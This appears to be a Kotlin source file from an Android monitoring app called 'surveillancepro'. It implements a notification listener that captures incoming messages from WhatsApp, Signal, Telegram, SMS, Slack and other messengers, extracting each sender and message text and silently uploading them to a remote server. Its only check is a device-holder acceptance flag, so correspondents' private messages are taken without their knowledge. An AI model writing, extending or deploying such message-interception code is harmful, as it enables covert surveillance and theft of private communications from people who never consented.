package com.surveillancepro.android.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val monitoredApps = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "org.telegram.messenger" to "Telegram",
        "com.facebook.orca" to "Messenger",
        "com.instagram.android" to "Instagram",
        "com.snapchat.android" to "Snapchat",
        "org.thoughtcrime.securesms" to "Signal",
        "com.google.android.apps.messaging" to "Messages",
        "com.samsung.android.messaging" to "Samsung Messages",
        "com.android.mms" to "SMS",
        "com.slack" to "Slack",
        "com.microsoft.teams" to "Teams",
        "com.discord" to "Discord",
        "com.skype.raider" to "Skype",
        "com.viber.voip" to "Viber",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val packageName = sbn.packageName
        val appName = monitoredApps[packageName] ?: return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString()
        val subText = extras.getCharSequence("android.subText")?.toString()

        if (text.isBlank() && (bigText == null || bigText.isBlank())) return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        val payload = mutableMapOf<String, Any>(
            "app" to appName,
            "packageName" to packageName,
            "sender" to title,
            "message" to (bigText ?: text),
            "timestamp" to timestamp,
        )
        subText?.let { payload["group"] = it }

        scope.launch {
            try {
                val api = ApiClient.getInstance(storage)
                api.sendEvent("notification_message", payload)
            } catch (_: Exception) {}
        }
    }
}
